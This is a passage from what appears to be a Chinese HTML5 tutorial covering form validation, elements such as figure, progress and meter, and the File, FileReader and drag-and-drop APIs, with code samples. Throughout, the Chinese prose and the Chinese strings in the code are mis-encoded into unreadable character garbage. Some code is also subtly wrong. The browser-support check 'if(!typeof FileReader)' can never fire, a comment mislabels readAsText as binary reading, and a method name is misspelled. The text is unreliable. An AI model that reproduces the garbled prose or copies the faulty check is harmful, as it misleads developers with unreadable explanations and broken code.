ä¸­çš„å€¼å¢žåŠ æˆ–è€…å‡å°‘çš„æ­¥å¹…ã€‚ æ˜¾å¼éªŒè¯ HTML5 ä¸­ï¼Œform ä¸Ž input(é™¤äº† select ä¸Ž textarea)éƒ½å…·æœ‰ä¸€ä¸ª checkValidityã€‚ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥æ˜¾ç¤ºå¯¹è¡¨å•å†…æ‰€æœ‰å…ƒç´ å†…å®¹æˆ–è€…å•ä¸ªå…ƒç´ å†…å®¹è¿›è¡Œæœ‰æ•ˆæ€§éªŒè¯ã€‚è¿”å›ž boolenå€¼ 12345678910111213141516171819&lt;form id="textform4" onsubmit="return check()"&gt; &lt;input type="url" value="http://laibh.top" id="url"&gt; &lt;input type="submit"&gt;&lt;/form&gt;&lt;script&gt; function check() &#123; const url = document.getElementById('url'); if (!url.value) &#123; console.log('åœ°å€ä¸èƒ½ä¸ºç©º'); return false; &#125; if (!url.checkValidity()) &#123; console.log('è¯·è¾“å…¥æ­£ç¡®çš„urlåœ°å€'); return false; &#125; console.log(url.value) &#125;&lt;/script&gt; ä½†å…¶å®žä¸€èˆ¬æäº¤æŒ‰é’®çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨æ£€éªŒæ ¼å¼ å–æ¶ˆæ ¡éªŒæœ‰ä¸¤ç§æ–¹æ³•å–æ¶ˆæ ¡éªŒï¼Œç¬¬ä¸€ç§ç”¨ formçš„ novalidateå±žæ€§ 1234&lt;form id="textform4" onsubmit="return check()" novalidate&gt; &lt;input type="url" value="http://laibh.top" id="url"&gt; &lt;input type="submit"&gt;&lt;/form&gt; ä½†æ˜¯ä¸Šè¿°çš„æ–¹æ³•é‡Œé¢çš„ checkValidity()ä»ä¼šç”Ÿæ•ˆ ç¬¬äºŒç§æ˜¯åˆ©ç”¨ input æˆ–è€… submitå…ƒç´ çš„ formnovalidateã€‚ 123456789&lt;form id="textform4" onsubmit="return check()"&gt; &lt;input type="url" value="http://laibh.top" id="url" formnovalidate="formnovalidate"&gt; &lt;input type="submit"&gt;&lt;/form&gt;&lt;!--æˆ–è€…--&gt;&lt;form id="textform4" onsubmit="return check()"&gt; &lt;input type="url" value="http://laibh.top" id="url"&gt; &lt;input type="submit" formnovalidate="formnovalidate"&gt;&lt;/form&gt; å‰è€…æ˜¯å•å•è®©ä¸€ä¸ª inputå–æ¶ˆéªŒè¯ï¼ŒåŽè€…æ˜¯å–æ¶ˆéªŒè¯æ•´ä¸ª formè¡¨å• è‡ªå®šä¹‰é”™è¯¯ä¿¡æ¯HTML5 ä¸­å¯ä»¥åˆ©ç”¨ javascript è°ƒç”¨å„ä¸ª input å…ƒç´ çš„ setCustomValidityæ–¹æ³•æ¥è‡ªå®šä¹‰é”™è¯¯ä¿¡æ¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è®¾ç½®äº† setCustomValidityï¼Œæ£€éªŒé€šè¿‡çš„æ¡ä»¶å˜æˆäº† setCustomValidity(&#39;&#39;) &amp;&amp; !valueMissing &amp;&amp; !patternMismatch 12345678910111213141516&lt;input type="text" id="code" required pattern="^\d&#123;4&#125;$" placeholder="è¯·è¾“å…¥ä»£ç " oninput="check(this)"&gt;&lt;script&gt; function check(i) &#123; let &#123; valueMissing,patternMismatch &#125; = i.validity; console.log(valueMissing,patternMismatch) if(valueMissing)&#123; i.setCustomValidity('è¯¥å­—æ®µä¸èƒ½ä¸ºç©ºï¼Œè¯·æŒ‰è¦æ±‚å¡«å…¥ä»£ç ') &#125;else&#123; if(patternMismatch)&#123; i.setCustomValidity('è¯·è¾“å…¥4ä½æ•°å­—çš„ä»£ç ') &#125;else&#123; i.setCustomValidity('') &#125; &#125; &#125; &lt;/script&gt; å¢žå¼ºçš„é¡µé¢å…ƒç´ figureå’Œ figcaption figureæ˜¯ä¸€ç§å…ƒç´ çš„ç»„åˆï¼Œå¸¦æœ‰å¯é€‰æ ‡é¢˜ã€‚figure å…ƒç´ ç”¨æ¥è¡¨ç¤ºç½‘é¡µä¸Šä¸€å—ç‹¬ç«‹å†…å®¹ï¼Œå°†å…¶ä»Žç½‘é¡µä¸Šç§»é™¤åŽä¸ä¼šå¯¹ç½‘é¡µä¸Šçš„å…¶ä»–å†…å®¹äº§ç”Ÿä»»ä½•å½±å“ã€‚figureå…ƒç´ æ‰€è¡¨ç¤ºçš„å†…å®¹å¯ä»¥æ˜¯å›¾ç‰‡ã€ç»Ÿè®¡å›¾æˆ–è€…ä»£ç ç¤ºä¾‹ã€‚ figcaptionè¡¨ç¤º figureå…ƒç´ çš„æ ‡é¢˜ï¼Œä»Žå±žäºŽ figureã€‚ä¸€ä¸ª figureæœ€å¤šåªå…è®¸é˜²æ­¢ä¸€ä¸ª figcaptionå…ƒç´ ï¼Œä½†æ˜¯è¿è¡Œæ”¾ç½®å¤šä¸ªå…¶ä»–å…ƒç´  12345&lt;figure&gt; &lt;figcaption&gt;é»„æµ¦æ±Ÿä¸Šçš„çš„å¢æµ¦å¤§æ¡¥&lt;/figcaption&gt; &lt;p&gt;æ‹æ‘„è€…ï¼šW3School é¡¹ç›®ç»„ï¼Œæ‹æ‘„æ—¶é—´ï¼š2010 å¹´ 10 æœˆ&lt;/p&gt; &lt;img src="http://www.w3school.com.cn/i/shanghai_lupu_bridge.jpg" width="350" height="234" /&gt;&lt;/figure&gt; figureæ‰€è¡¨ç¤ºçš„å†…å®¹é€šå¸¸æ˜¯å›¾ç‰‡ã€ç»Ÿè®¡å›¾æˆ–è€…ä»£ç ç¤ºä¾‹ï¼Œä¹Ÿå¯ä»¥æ˜¯éŸ³é¢‘æ’ä»¶ã€è§†é¢‘æ’ä»¶æˆ–è€…ç»Ÿè®¡è¡¨æ ¼ã€‚ details æä¾›äº†ä¸€ç§æ›¿ä»£ javascript çš„å°†ç”»é¢ä¸Šçš„å±€éƒ¨åŒºåŸŸè¿›è¡Œå±•å¼€æˆ–è€…æ”¶ç¼©çš„æ–¹æ³•ï¼Œç›®å‰åªæœ‰ Chrome å’Œ Safari 6 æ”¯æŒ 1234&lt;details&gt;&lt;summary&gt;Copyright 2011.&lt;/summary&gt;&lt;p&gt;All pages and graphics on this web site are the property of W3School.&lt;/p&gt;&lt;/details&gt; mark è¡¨ç¤ºé¡µé¢éœ€è¦é«˜äº®æˆ–è€…çªå‡ºæ˜¾ç¤ºçš„ã€‚åªå¥½æ˜¯å¯¹ç½‘é¡µå…¨æ–‡æ£€ç´¢æŸä¸ªå…³é”®è¯æ—¶æ˜¾ç¤ºçš„æ£€ç´¢ç»“æžœã€‚ 1&lt;p&gt;Do not forget to buy &lt;mark&gt;milk&lt;/mark&gt; today.&lt;/p&gt; ä¸ºäº†æŸç§ç‰¹æ®Šç›®çš„æŠŠåŽŸæ–‡ä½œè€…æ²¡æœ‰ç‰¹åˆ«é‡ç‚¹æ ‡ç¤ºçš„å†…å®¹ç»™æ ‡ç¤ºå‡ºæ¥ã€‚ ä¸Ž em ã€strongå…ƒç´ çš„åŒºåˆ«åœ¨äºŽå‰è€…æ˜¯ä½œè€…è‡ªå·±æ ‡å‡ºæ¥çš„é‡ç‚¹è¦æ³¨æ„çš„ï¼Œè€Œmarkè·Ÿä½œè€…æœ¬èº«æ²¡æœ‰å¤ªå¤šå…³ç³»ï¼Œæ˜¯åœ¨åŽæ¥å¼•ç”¨çš„æ—¶å€™æ·»åŠ ä¸ŠåŽ»çš„ã€‚ progress è¡¨ç¤ºä¸€ä¸ªä»»åŠ¡çš„å®Œæˆè¿›åº¦ã€‚ è¯¥å…ƒç´ æœ‰ä¸¤ä¸ªå‚æ•°æ¥è¡¨ç¤ºå½“å‰ä»»åŠ¡å®Œæˆæƒ…å†µã€‚valueè¡¨ç¤ºå®Œæˆäº†å¤šå°‘å·¥ä½œé‡ï¼Œmaxè¡¨ç¤ºæ€»å…±å¤šå°‘å·¥ä½œé‡ã€‚ åœ¨å±žæ€§è®¾å®šçš„æ—¶å€™ï¼Œè¿™ä¸¤ä¸ªå±žæ€§åªèƒ½è®¾å®šä¸ºæœ‰æ•ˆçš„æµ®ç‚¹æ•°ï¼Œvalueçš„å€¼å¿…é¡»å¤§äºŽ0ï¼Œå°äºŽç­‰äºŽ maxã€‚ 123456789101112131415&lt;h2&gt;progress ä½¿ç”¨ç¤ºä¾‹&lt;/h2&gt;&lt;p&gt;å®Œæˆç™¾åˆ†æ¯”ï¼š&lt;progress id="progress" max="100" value="0"&gt;&lt;span&gt;0&lt;/span&gt;%&lt;/progress&gt;&lt;/p&gt;&lt;input type="button" onclick='add()' value="è¯·ç‚¹å‡»"&gt;&lt;script&gt; const progressBar = document.getElementById('progress'); function add() &#123; progressBar.getElementsByTagName('span')[0].textContent = '0' for (let i = 0; i &lt;= 100; i++) &#123; setTimeout(function () &#123; progressBar.value = i; progressBar.getElementsByTagName('span')[0].textContent = i &#125;, 1000 * i) &#125; &#125;&lt;/script&gt; meter è¡¨ç¤ºè§„å®šèŒƒå›´å†…çš„æ•°é‡å€¼ã€‚ä¾‹å¦‚ç£ç›˜ä½¿ç”¨é‡ï¼Œå¯¹äºŽæŸä¸ªå€™é€‰è€…çš„æŠ•ç¥¨äººæ•°å æ€»æŠ•ç¥¨äººæ•°çš„æ¯”ä¾‹ç­‰ã€‚ meter å…ƒç´ æœ‰å…­ä¸ªå±žæ€§ï¼š å±žæ€§ å€¼ æè¿° high number å®šä¹‰åº¦é‡çš„å€¼ä½äºŽå“ªä¸ªç‚¹ï¼Œè¢«ç•Œå®šä¸ºé«˜çš„å€¼ã€‚ low number å®šä¹‰åº¦é‡çš„å€¼ä½äºŽå“ªä¸ªç‚¹ï¼Œè¢«ç•Œå®šä¸ºä½Žçš„å€¼ã€‚ max number å®šä¹‰æœ€å¤§å€¼ã€‚é»˜è®¤å€¼æ˜¯ 1ã€‚ min number å®šä¹‰æœ€å°å€¼ã€‚é»˜è®¤å€¼æ˜¯ 0ã€‚ optimum number å®šä¹‰ä»€ä¹ˆæ ·çš„åº¦é‡å€¼æ˜¯æœ€ä½³çš„å€¼ã€‚å¦‚æžœè¯¥å€¼é«˜äºŽ â€œhighâ€ å±žæ€§ï¼Œåˆ™æ„å‘³ç€å€¼è¶Šé«˜è¶Šå¥½ã€‚å¦‚æžœè¯¥å€¼ä½ŽäºŽ â€œlowâ€ å±žæ€§çš„å€¼ï¼Œåˆ™æ„å‘³ç€å€¼è¶Šä½Žè¶Šå¥½ã€‚ value number å®šä¹‰åº¦é‡çš„å€¼ã€‚ 1234&lt;meter value="5" min="0" max="10" high="8" low="2" optimum="5"&gt;3/10&lt;/meter&gt;&lt;br&gt;&lt;meter value="0.6"&gt;60%&lt;/meter&gt;&lt;p&gt;&lt;b&gt;æ³¨é‡Šï¼š&lt;/b&gt;Internet Explorer ä¸æ”¯æŒ meter æ ‡ç­¾ã€‚&lt;/p&gt; menuä¸Ž command ç”¨äºŽèœå•å·¥å…·æ¡ä¸Žå¼¹å‡ºèœå•ã€‚ä¸¤ä¸ªå…ƒç´ çš„æµè§ˆå™¨æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œä¸åšä»‹ç»ã€‚ ol å¢žåŠ äº† startä¸Ž reversedå±žæ€§ 1234567891011&lt;ol reversed&gt; &lt;li&gt;å’–å•¡&lt;/li&gt; &lt;li&gt;ç‰›å¥¶&lt;/li&gt; &lt;li&gt;èŒ¶&lt;/li&gt;&lt;/ol&gt;&lt;ol start="50" reversed&gt; &lt;li&gt;å’–å•¡&lt;/li&gt; &lt;li&gt;ç‰›å¥¶&lt;/li&gt; &lt;li&gt;èŒ¶&lt;/li&gt;&lt;/ol&gt; dl é‡æ–°å®šä¹‰åŽçš„ dlåˆ—è¡¨åŒ…å«å¤šä¸ªå¸¦åå­—çš„åˆ—è¡¨é¡¹ã€‚æ¯ä¸€é¡¹åŒ…å«ä¸€æ¡æˆ–è€…å¤šæ¡å¸¦åå­—çš„ dtå…ƒç´ ï¼Œç”¨æ¥è¡¨ç¤ºæœ¯è¯­ï¼Œdtå…ƒç´ åŽé¢ç´§è·Ÿä¸€ä¸ªæˆ–è€…å¤šä¸ª ddå…ƒç´ ï¼Œç”¨æ¥è¡¨ç¤ºå®šä¹‰ã€‚åœ¨ä¸€ä¸ªå…ƒç´ å†…ï¼Œä¸å…è®¸å¸¦æœ‰ç›¸åŒçš„ dtå…ƒç´ ï¼Œä¸å…è®¸æœ‰é‡å¤çš„æœ¯è¯­ã€‚dlå¯ä»¥ç”¨æ¥å®šä¹‰æ–‡ç« æˆ–è€…ç½‘é¡µä¸Šçš„æœ¯è¯­è§£é‡Š 123456&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt;&lt;dd&gt;Black hot drink&lt;/dd&gt;&lt;dt&gt;Milk&lt;/dt&gt;&lt;dd&gt;White cold drink&lt;/dd&gt;&lt;/dl&gt; cite æ ‡ç­¾å®šä¹‰ä½œå“ï¼ˆæ¯”å¦‚ä¹¦ç±ã€æ­Œæ›²ã€ç”µå½±ã€ç”µè§†èŠ‚ç›®ã€ç»˜ç”»ã€é›•å¡‘ç­‰ç­‰ï¼‰çš„æ ‡é¢˜ã€‚ä¸èƒ½æ˜¯äººå 1234&lt;img src="/i/ct_fcsz.jpg" alt="å¯Œæ˜¥å±±å±…å›¾" /&gt;&lt;p&gt;&lt;cite&gt;ã€Šå¯Œæ˜¥å±±å±…å›¾ã€‹&lt;/cite&gt;ç”±é»„å…¬æœ›å§‹ç”»äºŽè‡³æ­£ä¸ƒå¹´(1347)ï¼ŒäºŽè‡³æ­£åå¹´å®Œæˆã€‚&lt;/p&gt; small ç”±åŽŸæ¥çš„é€šç”¨å±•ç¤ºæ€§å…ƒç´ å˜æˆæ›´å…·ä½“çš„ã€ä¸“é—¨ç”¨æ¥æ ‡è¯†æ‰€è°“çš„â€å°å­—å°åˆ·ä½“â€çš„å…ƒç´ ã€‚é€šå¸¸ç”¨äºŽå…è´£å£°æ˜Žã€æ³¨æ„äº‹é¡¹ã€æ³•å¾‹æ³•è§„ã€ä¸Žç‰ˆæƒç›¸å…³ç­‰çš„æ³•å¾‹æ€§å£°æ˜Žæ–‡å­—ä¸­ï¼ŒåŒæ—¶ä¸å…è®¸è¢«åº”ç”¨åœ¨é¡µé¢ä¸»å†…å®¹ä¸­ï¼Œåªå…è®¸è¢«å½“åšè¾…åŠ©ä¿¡æ¯ç”¨ inlineæ–¹å¼å†…åµŒåœ¨é¡µé¢ä¸Šä½¿ç”¨ã€‚åŒæ—¶ smallå…ƒç´ ä¹Ÿä¸æ„å‘³ç€å…ƒç´ ä¸­å†…å®¹å­—ä½“ä¼šå˜å°ï¼Œå¦‚æžœéœ€è¦å°†å­—ä½“å˜å°ï¼Œéœ€è¦é…åˆ CSS æ ·å¼æ¥ç”¨ã€‚ æ–‡ä»¶ APIHTML5 ä¸­æä¾›äº†ä¸€ä¸ªå…³äºŽæ–‡ä»¶æ“ä½œçš„æ–‡ä»¶ API. FileList å¯¹è±¡ä¸Ž file å¯¹è±¡FileList å¯¹è±¡è¡¨ç¤ºç”¨æˆ·é€‰æ‹©çš„æ–‡ä»¶åˆ—è¡¨ã€‚åœ¨ HTML4 ä¸­ï¼Œfile æŽ§ä»¶åªå…è®¸æ”¾ç½®ä¸€ä¸ªæ–‡ä»¶ï¼Œåˆ°äº† HTML5 ä¸­ã€‚é€šè¿‡æ·»åŠ  multipleå±žæ€§ï¼ŒfileæŽ§ä»¶å…è®¸ä¸€æ¬¡æ”¾ç½®å¤šä¸ªæ–‡ä»¶ã€‚æŽ§ä»¶å†…çš„æ¯ä¸€ä¸ªç”¨æˆ·é€‰æ‹©çš„æ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ª fileå¯¹è±¡ï¼Œè€Œ FileListå¯¹è±¡åˆ™ä¸ºè¿™äº› fileå¯¹è±¡çš„åˆ—è¡¨ï¼Œä»£è¡¨ç”¨æˆ·é€‰æ‹©çš„æ‰€æœ‰æ–‡ä»¶ã€‚ fileå¯¹è±¡æœ‰ä¸¤ä¸ªå±žæ€§ï¼Œnameå±žæ€§è¡¨ç¤ºæ–‡ä»¶åï¼Œä¸åŒ…æ‹¬è·¯å¾„ï¼ŒlastModifiedDateå±žæ€§è¡¨ç¤ºæ–‡ä»¶çš„æœ€åŽä¿®æ”¹æ—¥æœŸã€‚ 12345678910111213&lt;input type="file" id="file" multiple size="80"&gt;&lt;input type="button" onclick="showFileName()" value="æ–‡ä»¶ä¸Šä¼ "&gt;&lt;script&gt; function showFileName()&#123; let file; const files = document.getElementById('file').files; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; file = files[i] console.log(file.name); &#125; &#125;&lt;/script&gt; Blobå¯¹è±¡Blob è¡¨ç¤ºäºŒè¿›åˆ¶åŽŸå§‹æ•°æ®ï¼Œå®ƒæä¾›ä¸€ä¸ª sliceæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡è¯¥æ–¹æ³•è®¿é—®åˆ°å­—èŠ‚å†…éƒ¨æ•°æ®å—ã€‚äº‹å®žä¸Šï¼Œä¸Šé¢çš„ fileå¯¹è±¡ä¹Ÿç»§æ‰¿äº†è¿™ä¸ª Blob å¯¹è±¡ã€‚ Blob å¯¹è±¡æœ‰ä¸¤ä¸ªå±žæ€§ï¼Œsizeå±žæ€§è¡¨ç¤ºä¸€ä¸ª Blob å¯¹è±¡çš„å­—èŠ‚é•¿åº¦ï¼Œtype å±žæ€§è¡¨ç¤º Blob çš„ MIME ç±»åž‹ï¼Œå¦‚æžœæ˜¯æœªçŸ¥ç±»åž‹çš„è¯ï¼Œè¿”å›žä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚ 123456789function showFileName()&#123; let file; const files = document.getElementById('file').files; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; file = files[i] console.log(file.name + '===' + file.size + '===' + file.type); &#125;&#125; é€šè¿‡å¯¹ file.sizeæˆ–è€… file.typeåˆ¤æ–­å¯ä»¥è¿›è¡Œæ–‡ä»¶å¤§å°ä¸Žæ–‡ä»¶ç±»åž‹çš„é™åˆ¶ã€‚å¦å¤– HTML5 å·²ç»å¯¹ fileæŽ§ä»¶æ·»åŠ äº† acceptå±žæ€§ï¼Œä¼å›¾è®© fileæŽ§ä»¶åªèƒ½æŽ¥å—æŸç§ç±»åž‹çš„æ–‡ä»¶ã€‚ 1&lt;input type="file" id="file" multiple size="80" accept="image/gif"&gt; è¿™æ ·æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™å°±ä¼šæ˜¾ç¤º gifç»“å°¾çš„æ–‡ä»¶ï¼Œå½“ç„¶å¦‚æžœä½ å¼ºè¡Œä¼ å…¶ä»–ç±»åž‹çš„ä¹Ÿæ˜¯æ²¡æœ‰æŠ¥é”™çš„ã€‚æ‰€ä»¥å¦‚æžœè¦åšé™åˆ¶ä¸Šä¼ æ–‡ä»¶ç±»åž‹çš„è¯è¦ç»“åˆ file.typeæ¥å®žçŽ°ã€‚ FileReaderæŽ¥å£ä¸»è¦ç”¨æ¥æŠŠæ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œå¹¶ä¸”è¯»å–æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚FileReader æŽ¥å£æœ‰äº†ä¸€ä¸ªå¼‚æ­¥ API,ä½¿ç”¨è¯¥ APIå¯ä»¥åœ¨æµè§ˆå™¨ä¸»çº¿ç¨‹ä¸­å¼‚æ­¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼Œè¯»å–æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚ æ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨ï¼š 123if(!typeof FileReader)&#123; // æµè§ˆå™¨ä¸ºå®žçŽ° FileReader æŽ¥å£&#125; æŽ¥å£æ–¹æ³• è¿™ä¸ªæŽ¥å£æ‹¥æœ‰4ä¸ªæ–¹æ³•ï¼Œå…¶ä¸­ä¸‰ä¸ªç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªç”¨æ¥è¯»å–è¿‡ç¨‹ä¸­æ–­ æ–¹æ³•å å‚æ•° æè¿° readAsBinaryString file å°†æ–‡ä»¶è¯»å–ä¸ºäºŒè¿›åˆ¶ç  readAsText file,[encoding] å°†æ–‡ä»¶è¯»å–ä¸ºæ–‡æœ¬ readAsDataURL file å°†æ–‡ä»¶è¯»å–ä¸º DataURL abort ï¼ˆnoneï¼‰ ä¸­æ–­è¯»å–æ“ä½œ readAsBinaryString,è¿™ä¸ªæ–¹æ³•å°†æ–‡ä»¶è¯»å–ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé€šå¸¸æˆ‘ä»¬æŠŠå®ƒä¼ é€åˆ°åŽç«¯ï¼ŒåŽç«¯å¯ä»¥é€šè¿‡è¿™æ®µå­—ç¬¦ä¸²å­˜å‚¨æ–‡ä»¶ã€‚ readAsText,æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡æœ¬çš„ç¼–ç æ–¹å¼ï¼Œé»˜è®¤å€¼ä¸º UTF-8ã€‚å°†æ–‡ä»¶ä»¥æ–‡æœ¬æ–¹å¼è¯»å–ï¼Œè¯»å–çš„ç»“æžœæ˜¯è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚ readAsDateURL,è¯¥æ–¹æ³•å°†æ–‡ä»¶è¯»å–ä¸ºä¸€ä¸² Data URLå­—ç¬¦ä¸²ï¼Œè¯¥æ–¹æ³•äº‹å®žä¸Šæ˜¯å°†å°æ–‡ä»¶ä»¥ä¸€ç§ç‰¹æ®Šæ ¼å¼çš„URL åœ°å€å½¢å¼ç›´æŽ¥è¯»å…¥é¡µé¢ã€‚è¿™é‡Œçš„å°æ–‡ä»¶é€šå¸¸æ˜¯å›¾åƒä¸Ž html æ ¼å¼çš„æ–‡ä»¶ã€‚ æŽ¥å£çš„äº‹ä»¶ é™¤äº†ä¸Šé¢æ‰“æ–¹æ³•ï¼ŒFileReader æŽ¥å£è¿˜åŒ…å«äº†ä¸€å¥—å®Œæ•´çš„äº‹ä»¶æ¨¡åž‹ï¼Œç”¨äºŽæ•èŽ·è¯»å–æ–‡ä»¶æ—¶çš„çŠ¶æ€ã€‚ äº‹ä»¶ æè¿° onabort æ•°æ®è¯»å–ä¸­æ–­æ—¶è§¦å‘ onerror æ•°æ®è¯»å–å‡ºé”™æ—¶è§¦å‘ onloadstart æ•°æ®å–æ•°å¼€å§‹æ—¶è§¦å‘ onprogress æ•°æ®è¯»å–ä¸­ onload æ•°æ®è¯»å–æˆåŠŸå®Œæˆæ—¶è§¦å‘ onloadend æ•°æ®è¯»å–å®Œæˆæ—¶è§¦å‘ï¼Œæ— è®ºæˆåŠŸæˆ–è€…å¤±è´¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;p&gt;&lt;label for="file"&gt;è¯·é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶&lt;/label&gt;&lt;input type="file" id="file" multiple&gt;&lt;input type="button" onclick="readAsDataURL()" value="è¯»å–å›¾åƒ"&gt;&lt;input type="button" onclick="readAsBinaryString()" value="è¯»å–äºŒè¿›åˆ¶æ•°æ®"&gt;&lt;input type="button" onclick="readAsText()" value="è¯»å–æ–‡æœ¬æ•°æ®"&gt;&lt;/p&gt;&lt;div name="result" id="result"&gt;&lt;/div&gt;&lt;script&gt;const result = document.getElementById('result');const file = document.getElementById('file');if (!typeof FileReader) &#123; alert('æµè§ˆå™¨ä¸æ”¯æŒ FileReader æŽ¥å£') file.setAttribute('disabled', 'disabled');&#125;function readAsDataURL() &#123; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¸ºå›¾åƒ const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('è¯·ç¡®ä¿æ–‡ä»¶éƒ½ä¸ºå›¾åƒç±»åž‹'); return false; &#125; let reader = new FileReader(); // å°†æ–‡ä»¶ä»¥ Data URL å½¢å¼è¯»å…¥é¡µé¢ reader.readAsDataURL(files[i]) reader.onload = function (e) &#123; let img = document.createElement('img') img.src = this.result result.appendChild(img) &#125; &#125;&#125;// å°†æ–‡ä»¶ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¯»å…¥é¡µé¢function readAsBinaryString() &#123; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¸ºå›¾åƒ const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('è¯·ç¡®ä¿æ–‡ä»¶éƒ½ä¸ºå›¾åƒç±»åž‹'); return false; &#125; let reader = new FileReader(); // å°†æ–‡ä»¶ä»¥ äºŒè¿›åˆ¶å½¢å¼è¯»å…¥é¡µé¢ reader.readAsBinaryString(files[i]) reader.onload = function (e) &#123; let p = document.createElement('p') p.innerHTML += this.result result.appendChild(p) &#125; &#125;&#125;// å°†æ–‡ä»¶ä»¥æ–‡æœ¬å½¢å¼è¯»å…¥é¡µé¢function readAsText() &#123; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¸ºå›¾åƒ const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('è¯·ç¡®ä¿æ–‡ä»¶éƒ½ä¸ºå›¾åƒç±»åž‹'); return false; &#125; let reader = new FileReader(); // å°†æ–‡ä»¶ä»¥ äºŒè¿›åˆ¶å½¢å¼è¯»å…¥é¡µé¢ reader.readAsText(files[i]) reader.onload = function (e) &#123; let p = document.createElement('p') p.innerHTML += this.result result.appendChild(p) &#125; &#125;&#125;&lt;/script&gt; å…³äºŽè¯»å–çŠ¶æ€çš„å…ˆåŽé¡ºåºï¼š 1234567891011121314151617181920212223242526272829function readAsDataURL() &#123; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¸ºå›¾åƒ const &#123; files &#125; = file; const len = files.length; for (let i = 0; i &lt; len; i++) &#123; if (!/image\/\w+/.test(files[i].type)) &#123; alert('è¯·ç¡®ä¿æ–‡ä»¶éƒ½ä¸ºå›¾åƒç±»åž‹'); return false; &#125; let reader = new FileReader(); // å°†æ–‡ä»¶ä»¥ Data URL å½¢å¼è¯»å…¥é¡µé¢ reader.readAsDataURL(files[i]) reader.onload = function (e) &#123; let img = document.createElement('img') img.src = this.result result.appendChild(img) console.log('load') &#125; reader.onprogress = function(e)&#123;console.log('progress');&#125; reader.onabort = function(e)&#123;console.log('abort');&#125; reader.onerror = function(e)&#123;console.log('error');&#125; reader.onloadstart = function(e)&#123;console.log('loadstart');&#125; reader.onloadend = function(e)&#123;console.log('loadend');&#125; &#125;&#125;// loadstart// progress// load// loadend åœ¨ onprogressé‡Œé¢å¯ä»¥ç”¨ progressæ¥æ˜¾ç¤ºæ–‡ä»¶è¯»å–çš„ç™¾åˆ†æ¯”ã€‚ æ‹–æ”¾ APIè™½ç„¶åœ¨ HTML5 ä¹‹å‰å·²ç»å¯ä»¥ä½¿ç”¨ mousedownã€mousemoveã€mouseupæ¥å®žçŽ°æ‹–æ”¾æ“ä½œï¼Œä½†æ˜¯è¿™åªæ˜¯åœ¨æµè§ˆå™¨å†…å®¹çš„æ‹–æ”¾ã€‚åœ¨ HTML5 ä¸­ï¼Œæ”¯æŒåœ¨æµè§ˆå™¨ä¸Žå…¶ä»–åº”ç”¨ç¨‹åºä¹‹é—´çš„æ•°æ®äº’ç›¸æ‹–åŠ¨ï¼ŒåŒæ—¶ä¹Ÿå¤§å¤§ç®€åŒ–äº†æ‹–æ”¾æ–¹é¢çš„ä»£ç ã€‚ å®žçŽ°æ‹–æ”¾çš„æ­¥éª¤ å°†æƒ³è¦æ‹–æ”¾çš„å¯¹è±¡å…ƒç´ çš„ draggableå±žæ€§è®¾ä¸º trueï¼Œè¿™æ ·æ‰èƒ½å°†è¯¥å…ƒç´ è¿›è¡Œæ‹–æ”¾ã€‚å¦å¤–ï¼Œimgå…ƒç´ ä¸Ž a å…ƒç´ é»˜è®¤è¿è¡Œæ‹–æ”¾ã€‚ ç¼–å†™ä¸Žæ‹–æ”¾æœ‰å…³çš„ä»£ç ã€‚ æ‹–æ”¾çš„ç›¸å…³äº‹ä»¶ äº‹ä»¶ äº§ç”Ÿäº‹ä»¶çš„å…ƒç´  æè¿° drastart è¢«æ‹–æ”¾çš„å…ƒç´  å¼€å§‹æ–½æ”¾æ“ä½œ drag è¢«æ‹–æ”¾çš„å…ƒç´  æ‹–æ”¾è¿‡ç¨‹ä¸­ dragenter æ‹–æ”¾è¿‡ç¨‹ä¸­é¼ æ ‡ç»è¿‡çš„å…ƒç´  è¢«æ‹–æ”¾çš„å…ƒç´ å¼€å§‹è¿›å…¥æœ¬å…ƒç´ çš„èŒƒå›´ dragover æ‹–æ”¾è¿‡ç¨‹ä¸­é¼ æ ‡ç»è¿‡çš„å…ƒç´  è¢«æ‹–æ”¾çš„å…ƒç´ æ­£åœ¨æœ¬å…ƒç´ èŒƒå›´å†…ç§»åŠ¨ dragleave æ‹–æ”¾è¿‡ç¨‹ä¸­é¼ æ ‡ç»è¿‡çš„å…ƒç´  è¢«æ‹–æ”¾çš„å…ƒç´ ç¦»å¼€æœ¬å…ƒç´ çš„èŒƒå›´ drop æ‹–æ”¾çš„ç›®æ ‡å…ƒç´  æœ‰å…¶ä»–å…ƒç´ è¢«æ‹–æ”¾åˆ°äº†æœ¬å…ƒç´ ä¸­ dragend æ‹–æ”¾çš„å¯¹è±¡å…ƒç´  